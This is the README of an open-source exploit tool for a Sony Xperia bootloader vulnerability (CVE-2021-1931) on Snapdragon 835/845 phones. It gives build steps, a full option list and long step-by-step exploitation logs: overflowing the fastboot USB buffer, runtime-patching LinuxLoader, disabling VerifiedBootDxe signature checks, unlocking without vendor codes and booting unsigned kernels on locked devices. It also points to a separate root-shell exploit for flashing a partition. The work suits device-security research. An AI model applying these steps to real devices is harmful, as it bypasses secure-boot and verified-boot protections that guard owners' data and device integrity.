xperable - Xperia ABL fastboot Exploit
======================================

The xperable tool is an exploit leveraging CVE-2021-1931 Android Boot Loader
vulnerability of fastboot usb interface on Sony Yoshino and Tama platforms,
based on Qualcomm Snapdragon 835 (MSM8998) and SDM845 chipsets.
That includes Sony Xperia XZ Premium, Xperia XZ1 and Xperia XZ1 Compact mobile
phones with many region specific models for Yoshino platform.
And Sony Xperia XZ2 / XZ2 Compact / XZ2 Premium / XZ3 with region specific
models for Tama platform.

The exploit achieves arbitrary code execution in fastboot providing arbitrary
memory access via fastboot usb interface to non-secure world RAM regions
in Qualcomm Secondary Bootloader, i.e. XBL (eXtensible Boot Loader) with ABL
(Android Boot Loader), including ability to write to read-only sections.


Features
--------

Currently working features:

- bootloader unlock without Sony unlock code even for devices with bootloader
  *unlock not allowed*, like the Japanese models
- re-lock bootloader to get back into original stock firmware state
- unlock/re-lock this way does not erase Sony DRM device key
- fastboot boot of not signed kernel in bootloader locked state (Tama is wip)
- flexible command line options for experimenting with bootloader runtime
  patching that can be scripted

Android userdata erase is also skipped with unlock/re-lock, but that seems not
to be that useful as the data is not accessible most likely because decryption
fails due to flipped bootloader unlock status - android does not boot, needing
the erase.

Still it is possible for example to do an unlock, boot any android recovery
kernel via ‘fastboot boot’ from usb and then re-lock BL back with following
android boot working with the original userdata content.

Possibility to boot not signed kernel in bootloader locked state from fastboot
can allow for example to boot a rooted stock kernel or boot android recovery
kernel with userdata access after authentication for decryption or even boot
full custom ROM with locked BL.


Limitations
-----------

Using the exploit to re-lock bootloader would not magically restore Sony
DRM device key, i.e. DRM protected functionality would not work with stock
firmware even after bootloader re-lock if the key had been already lost.

Hardware based attestation will get working with stock firmware after re-lock
only if ``persist`` partition is still intact, i.e. it did not get accidentaly
flashed with it's "empty" content from Sony stock firmware, loosing the attest
key this way.


Compilation
-----------

The xperable tool is primarily designed for Linux but it can be compiled for
Windows too. It depends on libusb-1.0 and uses `pe-parse`_ library which comes
as a git submodule with this project.

.. _pe-parse: https://github.com/trailofbits/pe-parse

Clone this repository recursively

::

  $ git clone --recursive https://github.com/j4nn/xperable.git

In the lilac-xnu source snapshot, run ``./lilac build xperable`` from the
main repository root instead. It builds the native macOS or Linux host tool
for p114 with the bundled pe-parse source. Clang, CMake, pkg-config and libusb
are required. The original standalone and cross-compilation Makefile flows
are not maintained in this snapshot.

The exploit needs yoshino LinuxLoader UEFI module as fastboot runtime patch
base. It can be exctracted from ABL of Sony stock firmware bootloader -
`uefi-firmware-parser`_ tool is needed for this. Supply a previously extracted
module using ``./lilac build xperable --loader /path/to/LinuxLoader-p114.pe``;
it is copied into the output runtime directory and hashed in the manifest.
This build does not download firmware or invoke extraction in the source tree.

The remaining device instructions are upstream reference, not authorization
to flash, downgrade or change device lock state. Lilac device validation
uses RAM boot only with the existing matching p114 firmware and system map.

.. _uefi-firmware-parser: https://github.com/theopolis/uefi-firmware-parser


Yoshino Device Setup
--------------------

The exploit is targetting ``LA2_0_P_114`` bootloader, but it needs XFL
from ``LA1_1_O_77`` version in order to work. While XFL is not directly
used in fastboot mode, ABL customized by Sony verifies XFL integrity
for some reason, influencing bootloader memory layout.
XFL is a linux kernel that provides Sony flash mode (green LED light)
functionality for flashing stock firmware files.

With any newer XFL version the exploit is not able to overflow fastboot
usb buffer into ABL code region, most likely because of bigger XFL size
in all newer bootloader versions. Therefore you need to flash the old XFL
manually from a root shell via dd command to ``xfl`` partition.

In case bootloader is still locked, you can get a temporal root shell using
`bindershell`_ exploit available for Sony stock Android Oreo firmware.
If running a newer firmware, downgrade would be needed requiring userdata
erase, so you may need to backup the phone first.
Please check what firmware versions are supported by bindershell `here`_.

.. _bindershell: https://github.com/j4nn/renoshell/tree/CVE-2019-2215
.. _here: https://github.com/j4nn/renoshell/blob/CVE-2019-2215/jni/offsets.c#L36

After making sure you can get a root shell, flash the ``LA2_0_P_114``
bootloader version using only the ``boot`` subdirectory of the latest
stock firmware available for your phone skipping flash of everything else.

Prepare the old XFL image using ``make boot/xfl-o77.mbn`` command
in this project's directory, following shown instructions to get
required files if missing.

Upload the ``boot/xfl-o77.mbn`` file to the phone using adb or sdcard
and use following command in a root shell to flash it to xfl partition:

::

  # dd if=/sdcard/xfl-o77.mbn of=/dev/block/bootdevice/by-name/xfl

You may need to adjust the location of xfl-o77.mbn in the ``if=`` option
depending on where the file has been copied to. It may be also safer
to use ``sync`` command in addition before rebooting the phone.


Tama Device Setup
-----------------

The exploit is targetting ``LA2_0_P_118`` bootloader of XZ2 / XZ3 devices.
This version of bootloader is present in the newest stock firmware versions
of Japan specific models.

International Tama devices have newer version of bootloader in the latest
firmware versions, so you may need to downgrade in order to use the exploit.
Flash only the ``boot`` subdirectory of 52.0.A.8.50 stock fw version skipping
flash of everything else.


Command Line Options
--------------------

The xperable tool interprets command line options shown bellow, immediately
executing each of them as they appear, allowing to craft bootloader runtime
patching scripts.

::

  $ ./xperable -h

  xperable - Xperia ABL fastboot Exploit
  (  https://github.com/j4nn/xperable  )

  usage: ./xperable [-h] [-v] [-q] [-V] [-Q] [-A] [-B] [-U]
                    [-b maxsize] [-t timeout] [-o offset] [-s size]
                    [-c command] [-x] [-0] [-1] [-2] [-3] [-4]
                    [-5] [-6] [-7] [-8] [-9] [-C cmdline]
                    [-l] [-m] [-a addr] [-M module]
                    [-r] [-O file] [-I file] [-w]
                    [-P file] [-p patch]

    -h            show this help and exit
    -v            increase fastboot usb communication verbosity
    -q            lower fastboot usb communication verbosity
    -V            increase verbosity of the exploit itself
    -Q            lower verbosity of the exploit
    -A            do 'fastboot getvar all' with filtered output
    -B            do 'fastboot getvar version-bootloader' command
    -U            do 'fastboot getvar unknown' command
    -b maxsize    set usb chunk max size to use with all transfers
    -t timeout    set usb transfer timeout in ms, 5000 by default
    -o offset     set offset parameter used in exploit test cases
    -s size       set size parameter used with other options
    -c command    set fastboot command string
    -x            use extended version of abl patch
    -0            basic test case to try to crash ABL LinuxLoader
    -1            do previously set fastboot command
    -2            try to return buffer offset distance to code hit
    -3            similar as -2 option but using alternative method
    -4            do full ABL LinuxLoader patching exploit
    -5            similar as -4 option but using alternative method
    -6            patch signature verification in VerifiedBootDxe
    -7            fake unlock via 'green' -> 'orange' in kcmdline
    -8            patch boot command to use two kernel images
    -9            experimental stuff to test patch level override
    -l            read out bootloader log from RAM, needs -4/-5 first
    -m            list XBL UEFI modules with their base addresses
    -a addr       set address used with BL RAM read and write options
    -M module     set address for RAM r/w to base addr of UEFI module
    -r            read 'size' block of bytes from 'addr' base in BL
    -O file       write 'size' of bytes from tool's buffer to 'file'
    -I file       read 'file' into tool's buffer setting 'size' too
    -w            write 'size' block of bytes to 'addr' base in BL
    -P file       load PE file to tool's buffer doing relocation
                  to 'addr' base, setting 'size' to code boundary,
                  applying -4/-5 patch in case of LinuxLoader fname
    -p patch      apply specified 'patch' sequence to tool's buffer

  'patch' is one or more 'subpatch' delimited by comma character
  'subpatch' is 'hexoffs' 'patchseq' pair delimited by one of ':/%@'
  characters specifying size or form of each element of 'patchseq'
  'patchseq' is list of hex values delimited by comma character

  There is following meaning of 'hexoffs' and 'patchseq' delimiter:
    :             'patchseq' hex values are byte values
    /             'patchseq' hex values are 32 bit values
    %             'patchseq' hex values are 32 bit to be byte swapped
    @             'patchseq' hex values are 64 bit values


Usage Examples
--------------

It may be possible to use defaults preset in the exploit when testing
with **Xperia XZ1 Compact (G8441)**, like this:

::

  $ ./xperable -B -U -4
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [+] Starting test4 size = 0xf3f880, offset = 0x30, payloadsize = 0xe7000
  [+] Got LinuxLoader base addr 0x98dc0000 (0xa9ed1111)
  [+] LinuxLoader @ 0x98dc0000 patched successfully (usb buff @ 0x97e85000, distance = 0x00f3b000)

  $ ./xperable -l | grep -w 'BOOT\|XBOOT\|Build'
  [+] Print log buffer, logbuf_pos = 0x0000, length = 0x24ca:
  UEFI Ver    : 4.2.190723.BOOT.XF.1.2.2.c1-00023-M8998LZB-1.209796.1
  Build Info  : 64b Jul 23 2019 16:44:00
  UEFI Ver   : 4.2.190723.BOOT.XF.1.2.2.c1-00023-M8998LZB-1.209796.1
  Loader Build Info: Jul 23 2019 16:47:39
  XBOOT (1306-5035_X_Boot_MSM8998_LA2.0_P_114)
  Fastboot Build Info: Jul 23 2019 16:47:34

With the above ``-4`` done succesfully bootloader can be unlocked (aka Y)
or re-locked (aka X) in following way:

::

  $ ./xperable -c "oem unlock Y" -1 -c reboot -1
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'oem unlock Y'
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot'

  $ ./xperable -c "oem unlock X" -1 -c reboot -1
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'oem unlock X'
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot'

Following examples show testing with **Xperia XZ1 Dual SIM (G8342)**.
Test if we can get fastboot code execution with usb buffer overflow
into an infinite loop fully hanging fastboot.

::

  $ ./xperable -v -V -B -U -s 0xfff000 -0
        {00000019->00000019:OK} "getvar:version-bootloader"
        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [.] Using p114 xperable target (offset = 0x30, size = 0xf3f800)
        {0000000e->0000000e:OK} "getvar:unknown"
        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
  [+] Starting test0 size = 0x00fff000, offset = 0x00000030, cmd = 'download:00000010'
    00000000-0000002c: [ 00 00 40 94 ]
    00000030-00ffeffc: [ 00 00 00 14 ]
        {00fff000->00fff000:OK} "download:00000010.@...@...@...@...@...@...@...@................."
        {00000040<-00000000:TO} ""
  [!] libusb_bulk_transfer failed: Operation timed out ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp recv failed (rspsz=0x0040)
        {00000011->00000011:OK} "download:00000010"
        {00000040<-00000000:TO} ""
  [!] libusb_bulk_transfer failed: Operation timed out ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp recv failed (rspsz=0x0040)
  [.] Finished test0: res = -1

  $ ./xperable -c reboot-bootloader -1
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'
  [!] libusb_bulk_transfer failed: Operation timed out ep=0x01 len=0x0011 size=0x0011
  [!] fbusb_bufcmd send failed: reqsz=0x11 res=0xffffffff
  [!] libusb_bulk_transfer failed: Operation timed out ep=0x01 len=0x0011 size=0x0011
  [!] fbusb_bufcmd send failed: reqsz=0x11 res=0xffffffff

Not responding to ``reboot-bootloader`` fastboot command most likely confirms
hanging code execution. Force reboot by holding power with Vol+ buttons together,
then holding only Vol+ in order to boot back into fastboot.

Now try to find a working buffer overflow size with test case ``-2``.
Binary seach may be used in order to narrow down the range.

::

  $ ./xperable -v -V -B -U -s 0xf30080 -2
        {00000019->00000019:OK} "getvar:version-bootloader"
        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [.] Using p114 xperable target (offset = 0x30, size = 0xf3f800)
        {0000000e->0000000e:OK} "getvar:unknown"
        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
  [+] Starting test2 size = 0xf30080, offset = 0x30, cmd = 'download:00000010'
        {00f30080->00f30080:OK} "download:00000010..............................................."
        {00000040<-0000000d:OK} "DATA00000010."
        {00000010->00000010:OK} "AAAAAAAAAAAAAAAA"
        {00000040<-00000004:OK} "OKAY"
  [+] test2 not hit: response = ''

  $ ./xperable -c reboot-bootloader -1
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'

As it did not hit, try with bigger size:

::

  $ ./xperable -v -V -B -U -s 0xf60080 -2
        {00000019->00000019:OK} "getvar:version-bootloader"
        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [.] Using p114 xperable target (offset = 0x30, size = 0xf3f800)
        {0000000e->0000000e:OK} "getvar:unknown"
        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
  [+] Starting test2 size = 0xf60080, offset = 0x30, cmd = 'download:00000010'
        {00f60080->00f60080:OK} "download:00000010..............................................."
        {00000040<-00000000:IO} ""
  [!] libusb_bulk_transfer failed: Input/Output Error ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp recv failed (rspsz=0x0040)
        {00000011->00000000:IO} ""
  [!] libusb_bulk_transfer failed: Input/Output Error ep=0x01 len=0x0011 size=0x0011
  [!] fbusb_bufcmd send failed: reqsz=0x11 res=0xffffffff
  [!] test2 failed: response = ''

It crashed and rebooted - be quick to hold Vol+ key to get back to fastboot
mode. One more try with size in the middle:

::

  $ ./xperable -v -V -B -U -s 0xf48080 -2
        {00000019->00000019:OK} "getvar:version-bootloader"
        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [.] Using p114 xperable target (offset = 0x30, size = 0xf3f800)
        {0000000e->0000000e:OK} "getvar:unknown"
        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
  [+] Starting test2 size = 0xf48080, offset = 0x30, cmd = 'download:00000010'
        {00f48080->00f48080:OK} "download:00000010..............................................."
        {00000040<-00000012:OK} "f46eb0-vxyzf46eb0-"
  [+] test2 succeeded: distance = 0xf46eb0 + 0x00 (offset was 0x30)

  $ ./xperable -c reboot-bootloader -1
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'

Add 0x29d0 to the reported distance and use that size with ``-4`` test case:

::

  $ ./xperable -v -V -B -U -s 0xf49880 -4
        {00000019->00000019:OK} "getvar:version-bootloader"
        {00000040<-00000028:OK} "OKAY1306-5035_X_Boot_MSM8998_LA2.0_P_114"
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [.] Using p114 xperable target (offset = 0x30, size = 0xf3f800)
        {0000000e->0000000e:OK} "getvar:unknown"
        {00000040<-0000001d:OK} "FAILGetVar Variable Not found"
  [.] Code boundary of LinuxLoader-p114.pe is 0x000e7000
  [+] Starting test4 size = 0xf49880, offset = 0x30, payloadsize = 0xe7000
        {00f49880->00f49880:OK} "download:000e7010...................................@u@.N5O)...."
        {00000040<-0000000d:OK} "DATA........."
  [+] Got LinuxLoader base addr 0x98dbe000 (0xa9ecf111)
        {000e7000->000e7000:OK} "MZ..........................................................X..."
        {00000040<-00000004:OK} "OKAY"
        {00000008->00000008:OK} "flash:fb"
        {00000040<-00000017:OK} "FAIL98DBE000/97E79000.."
  [+] LinuxLoader @ 0x98dbe000 patched successfully (usb buff @ 0x97e79000, distance = 0x00f45000)

With locked bootloader ``fastboot boot`` command is not allowed, test that:

::

  $ ./xperable -A
  unlocked:no
  version-baseband:1307-7471_47.2.A.11.228
  version-bootloader:1306-5035_X_Boot_MSM8998_LA2.0_P_114
  secure:yes
  product:G8342

  $ ./xperable -v -V -I twrp-poplar.img -1 -c boot -1
  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'download:025f4000'
        {00000011->00000011:OK} "download:025f4000"
        {00000040<-0000000d:OK} "DATA025f4000."
        {01000000->01000000:OK} "ANDROID!.........?o.........................<&]................."
        {01000000->01000000:OK} "...B.=..#.#..+.}Y..5.......G}D..#..q?....%_..m..)<...N...{.....t"
        {005f4000->005f4000:OK} "`...................@.C..A.........!f....L.....+.y.r.........).."
        {00000040<-00000004:OK} "OKAY"
  [.] Finished test1: res = 0
  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'boot'
        {00000004->00000004:OK} "boot"
        {00000040<-00000017:OK} "FAILCommand not allowed"
  Command not allowed
  [.] Finished test1: res = 1

Runtime patch it (being in successful ``-4`` state) and test ``fastboot boot`` again:

::

  $ ./xperable -M LinuxLoader -P LinuxLoader-p114.pe -p 286DC%1f2003d5 -w
  [+] Loaded LinuxLoader-p114.pe (res=1052672, size=946176), applied LinuxLoader patch

  $ ./xperable -M VerifiedBootDxe -s 0xc000 -r -p 25FC%3d000014 -w

  $ ./xperable -v -V -I twrp-poplar.img -1 -c boot -1
  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'download:025f4000'
        {00000011->00000011:OK} "download:025f4000"
        {00000040<-0000000d:OK} "DATA025f4000."
        {01000000->01000000:OK} "ANDROID!.........?o.........................<&]................."
        {01000000->01000000:OK} "...B.=..#.#..+.}Y..5.......G}D..#..q?....%_..m..)<...N...{.....t"
        {005f4000->005f4000:OK} "`...................@.C..A.........!f....L.....+.y.r.........).."
        {00000040<-00000004:OK} "OKAY"
  [.] Finished test1: res = 0
  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'boot'
        {00000004->00000004:OK} "boot"
        {00000040<-00000004:OK} "OKAY"
  [.] Finished test1: res = 0

Not signed android kernel booted in bootloader locked state. The above patch
to allow ``fastboot boot`` in bootloader locked state is already integrated
in the exploit - it can be enabled by ``-x`` option used within the ``-4`` run.
The patch of VerifiedBootDxe to skip image signature verification is implemented
with ``-6`` test case. Not signed kernel can be booted from fastboot right after
that:

::

  $ ./xperable -c reboot-bootloader -1
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot-bootloader'

  $ ./xperable -B -U -s 0xf49880 -x -4 -6
  version-bootloader: 1306-5035_X_Boot_MSM8998_LA2.0_P_114
  [+] Starting test4 size = 0xf49880, offset = 0x30, payloadsize = 0xe7000
  [+] Got LinuxLoader base addr 0x98db9000 (0xa9eca111)
  [+] LinuxLoader @ 0x98db9000 patched successfully (usb buff @ 0x97e74000, distance = 0x00f45000)
  [+] Starting test6
  [+] VerifiedBootDxe @ 0x9b2f0000 patched successfully

  $ ./xperable -I twrp-poplar.img -1 -c boot -1
  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'download:025f4000'
  [+] Starting test1 size = 0x025f4000, offset = 0xffffffff, cmd = 'boot'



It may be possible to use defaults preset in the exploit when testing
with **Xperia XZ2 (H8266)**, like this:

::

  $ ./xperable -B -U -5
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] Starting test5 size = 0x400f90, offset = 0x2a7000, payloadsize = 0xfb000
  [+] Got LinuxLoader base addr 0x988c1000 (0x988f3278)
  [+] LinuxLoader @ 0x988c1000 patched successfully (usb buff @ 0x984c7000, distance = 0x003fa000)

  $ ./xperable -l | grep -w 'BOOT\|XBOOT\|Build'
  [+] Print log buffer, logbuf_pos = 0x0000, length = 0x3354:
  S - QC_IMAGE_VERSION_STRING=BOOT.XF.2.0-00364-SDM845LZB-1
  UEFI Ver    : 5.0.180827.BOOT.XF.2.0-00364-SDM845LZB-1
  Build Info  : 64b Aug 27 2018 18:24:43
  Loader Build Info: Aug 27 2018 18:27:12
  XBOOT (1310-7079_X_Boot_SDM845_LA2.0_P_118)
  Fastboot Build Info: Aug 27 2018 18:27:10

With the above ``-5`` done succesfully bootloader can be unlocked (aka Y)
or re-locked (aka X) in the following way:

::

  $ ./xperable -c "oem unlock Y" -1 -c reboot -1
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'oem unlock Y'
  Device already unlocked
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot'

With XZ2 already unlocked the default exploit setup no longer works, it seems
memory layout is randomized differently. So we need to find new hit offset
range if we like to re-lock bootloader back.

::

  $ ./xperable -B -U -s 0xfff000 -0
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] Starting test0 size = 0x00fff000, offset = 0x002a7000, cmd = 'download:00000010'
    00000000-002a6ffc: [ 00 00 40 94 ]
    002a7000-00ffeffc: [ 00 00 00 14 ]
  [!] libusb_bulk_transfer failed: Operation timed out ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp recv failed (rspsz=0x0040)
  [!] libusb_bulk_transfer failed: Operation timed out ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp recv failed (rspsz=0x0040)

With fastboot hanging like above, the code execution is most likely confirmed.
Now try to find a working buffer overflow size with test case ``-3``.
Binary search may be used in order to narrow down the range.

::

  $ ./xperable -B -U -s 0xb00f90 -3
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] Starting test3 size = 0xb00f90, offset = 0x2a7000, cmd = 'download:00000010'
  [+] test3 not hit: response = ''

Not enough overflow size, try a bigger one next.

::

  $ ./xperable -B -U -s 0xc00f90 -3
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] Starting test3 size = 0xc00f90, offset = 0x2a7000, cmd = 'download:00000010'
  [!] libusb_bulk_transfer failed: Input/Output Error ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp recv failed (rspsz=0x0040)
  [!] libusb_bulk_transfer failed: Input/Output Error ep=0x01 len=0x0011 size=0x0011
  [!] fbusb_bufcmd send failed: reqsz=0x11 res=0xffffffff
  [!] test3 failed: response = ''

Resulted in reboot, so assuming code execution hit.
Binary search to narrow down the exploit hit range.

::

  $ ./xperable -B -U -s 0xb80f90 -3
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] Starting test3 size = 0xb80f90, offset = 0x2a7000, cmd = 'download:00000010'
  [!] libusb_bulk_transfer failed: Input/Output Error ep=0x81 len=0x0040 size=0x0040
  [!] fbusb_bufcmd_resp recv failed (rspsz=0x0040)
  [!] libusb_bulk_transfer failed: Input/Output Error ep=0x01 len=0x0011 size=0x0011
  [!] fbusb_bufcmd send failed: reqsz=0x11 res=0xffffffff
  [!] test3 failed: response = ''

  $ ./xperable -B -U -s 0xb40f90 -3
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] Starting test3 size = 0xb40f90, offset = 0x2a7000, cmd = 'download:00000010'
  [+] test3 succeeded: distance = 0xb23c00, hit from 0x032274, base = 0x988b9000 (offset=0x2a7000 size=0xb40f90)

Getting a working attempt, try to re-lock bootloader back.
Reboot into fastboot after successful ``-3`` (force reset may be needed).

::

  $ ./xperable -B -U -s 0xb40f90 -5
  version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
  [+] Starting test5 size = 0xb40f90, offset = 0x2a7000, payloadsize = 0xfb000
  [+] Got LinuxLoader base addr 0x988bb000 (0x988ed278)
  [+] LinuxLoader @ 0x988bb000 patched successfully (usb buff @ 0x97d91000, distance = 0x00b2a000)

  $ ./xperable -l | grep -w 'BOOT\|XBOOT\|Build'
  [+] Print log buffer, logbuf_pos = 0x0000, length = 0x3437:
  S - QC_IMAGE_VERSION_STRING=BOOT.XF.2.0-00364-SDM845LZB-1
  UEFI Ver    : 5.0.180827.BOOT.XF.2.0-00364-SDM845LZB-1
  Build Info  : 64b Aug 27 2018 18:24:43
  Loader Build Info: Aug 27 2018 18:27:12
  XBOOT (1310-7079_X_Boot_SDM845_LA2.0_P_118)
  Fastboot Build Info: Aug 27 2018 18:27:10

  $ ./xperable -c "oem unlock X" -1 -c reboot -1
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'oem unlock X'
  Device already unlocked
  [+] Starting test1 size = 0xffffffff, offset = 0xffffffff, cmd = 'reboot'

While there is the "Device already unlocked" message, the exploit actually worked
and bootloader had been re-locked:

::

  $ ./xperable -A
  unlocked:no
  version-baseband:1311-7920_52.1.A.3.49
  version-bootloader:1310-7079_X_Boot_SDM845_LA2.0_P_118
  secure:yes
  product:H8266


Trying to boot twrp with locked xz2 fails most of the time so far as exploited
fastboot state seems not to be stable enough or there may be a bug or something
still missing that needs to be implemented, so this is still work in progress.
But there has been eventually one case in which twrp booted successfully.

.. raw:: html

   <details>
   <summary><a>two kernels exploit variant</a></summary>

.. code-block::

   $ ./xperable -v -v -V -V -B -U -x -x -x -5 -I boot_X-FLASH-ALL-B6B5.img -c twrp-akari.img -8
         {00000019->00000019:OK} 67 65 74 76 61 72 3a 76 65 72 73 69 6f 6e 2d 62 "getvar:version-bootloader"
         {00000040<-00000027:OK} 4f 4b 41 59 31 33 31 30 2d 37 30 37 39 5f 58 5f "OKAY1310-7079_X_Boot_SDM845_LA2.0_P_118"
   version-bootloader: 1310-7079_X_Boot_SDM845_LA2.0_P_118
   [.] Using p118 xperable target (offset = 0x2a7000, size = 0x400f90)
         {0000000e->0000000e:OK} 67 65 74 76 61 72 3a 75 6e 6b 6e 6f 77 6e       "getvar:unknown"
         {00000040<-0000001d:OK} 46 41 49 4c 47 65 74 56 61 72 20 56 61 72 69 61 "FAILGetVar Variable Not found"
   [.] Code boundary of LinuxLoader-p118.pe is 0x000fb000
   [+] Starting test5 size = 0x400f90, offset = 0x2a7000, payloadsize = 0xfb000
         {00400f90->00400f90:OK} 64 6f 77 6e 6c 6f 61 64 3a 30 30 30 66 62 30 31 "download:000fb010..............................................."
         {00000040<-0000000d:OK} 44 41 54 41 78 e2 8e 98 00 00 00 00 00          "DATAx........"
   [+] Got LinuxLoader base addr 0x988bc000 (0x988ee278)
         {000fb000->000fb000:OK} 4d 5a 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "MZ..........................................................X..."
         {00000040<-00000004:OK} 4f 4b 41 59                                     "OKAY"
         {00000008->00000008:OK} 66 6c 61 73 68 3a 66 62                         "flash:fb"
         {00000040<-00000017:OK} 46 41 49 4c 39 38 38 42 43 30 30 30 2f 39 38 34 "FAIL988BC000/984C5000.."
   [+] LinuxLoader @ 0x988bc000 patched successfully (usb buff @ 0x984c5000, distance = 0x003f7000)
   [+] Starting test8
   [.] Code boundary of LinuxLoader-p118.pe is 0x000fb000
   [+] LinuxLoader @ 0x988bc000 already patched for test8
         {00000011->00000011:OK} 64 6f 77 6e 6c 6f 61 64 3a 30 36 62 35 61 30 31 "download:06b5a010"
         {00000040<-0000000d:OK} 44 41 54 41 30 36 62 35 61 30 31 30 00          "DATA06b5a010."
         {01000000->01000000:OK} 41 4e 44 52 4f 49 44 21 47 ef e5 00 00 80 00 00 "ANDROID!G...................................G..................."
         {01000000->01000000:OK} 4d ae 7d 7f 8f 38 b9 18 72 7c 6e f9 3f 99 d8 3b "M.}..8..r|n.?..;yh-....`...:jm......C..W.......m......o.n......."
         {01000000->01000000:OK} 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "................................................................"
         {01000000->01000000:OK} 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 "................................................................"
         {01000000->01000000:OK} 00 a0 b5 02 00 00 00 00 41 4e 44 52 4f 49 44 21 "........ANDROID!C.......8...........................<&]........."
         {01000000->01000000:OK} 8a 11 cf 16 ea 12 c1 d9 85 f2 ba f1 7a 65 51 7c "............zeQ|Z%*M7^.,.....hX....1j..0.W..'y;....Xu...A!N.T.^."
         {00b5a010->00b5a010:OK} 59 1f 61 6c 59 6f 33 62 20 57 62 8d 08 83 3e af "Y.alYo3b Wb...>.N...........zL..Zlsod..1.~..l..m..O....i..7.k.vk"
         {00000040<-00000004:OK} 4f 4b 41 59                                     "OKAY"
         {00000004->00000004:OK} 62 6f 6f 74                                     "boot"
         {00000040<-00000004:OK} 4f 4b 41 59                                     "OKAY"
   [+] test8 succeeded

.. raw:: html

   </details>

Although decryption did not work in this case, adb shell could be used.

.. raw:: html

   <details>
   <summary><a>adb shell</a></summary>

.. code-block::

  akari:/ # uname -a
  Linux localhost 4.9.186-perf+ #1 SMP PREEMPT Thu Oct 2 22:00:09 2025 aarch64

  akari:/ # cat /proc/cmdline
  rcupdate.rcu_expedited=1 androidboot.selinux=permissive androidboot.console=ttyMSM0 androidboot.hardware=qcom androidboot.usbcontroller=a600000.dwc3 lpm_levels.sleep_disabled=1 msm_rtb.filter=0x237 service_locator.enable=1 swiotlb=2048 ehci-hcd.park=3 androidboot.configfs=true loop.max_part=7 panic_on_err=1 msm_drm.dsi_display0=dsi_panel_cmd_display:config0 zram.backend=z3fold video=vfb:640x400,bpp=32,memsize=3072000 twrpfastboot=1 buildvariant=userdebug androidboot.verifiedbootstate=green androidboot.keymaster=1 dm="1 vroot none ro 1,0 8127088 verity 1 PARTUUID=c351ca12-1a0f-43aa-911e-99daf8ba5dcd PARTUUID=c351ca12-1a0f-43aa-911e-99daf8ba5dcd 4096 4096 1015886 1015886 sha1 a16d90654215feadb5413403b2f72f007bdea3c1 aee087a5be3b982978c923f566a94613496b417f2af592639bc80d141e34dfe7 10 restart_on_corruption ignore_zero_blocks use_fec_from_device PARTUUID=c351ca12-1a0f-43aa-911e-99daf8ba5dcd fec_roots 2 fec_blocks 1023887 fec_start 1023887" root=/dev/dm-0 androidboot.vbmeta.device=PARTUUID=6995d1b0-2855-4d80-9e2b-9a386e09bd5e androidboot.vbmeta.avb_version=1.0 androidboot.vbmeta.device_state=locked androidboot.vbmeta.hash_alg=sha256 androidboot.vbmeta.size=3456 androidboot.vbmeta.digest=1504743017b278b3371f673ed3653b5766a47d152a13475c8ac3794b91f67861 androidboot.vbmeta.invalidate_on_error=yes androidboot.veritymode=enforcing androidboot.bootdevice=1d84000.ufshc androidboot.baseband=sdm lcdid_adc=1310806 androidboot.slot_suffix=_b skip_initramfs rootwait ro init=/init  oemandroidboot.imei=xxxxxxxxxxxxxx oemandroidboot.security=1 oemandroidboot.securityflags=0x00000002

.. raw:: html

   </details>


Linux Host Setup
----------------

The exploit may need to use big usb transfers, like 16MB or more. This is most
likely not supported by default, so kernel of your linux distro may need to be
patched and recompiled in order to support allocation of big usb buffers.
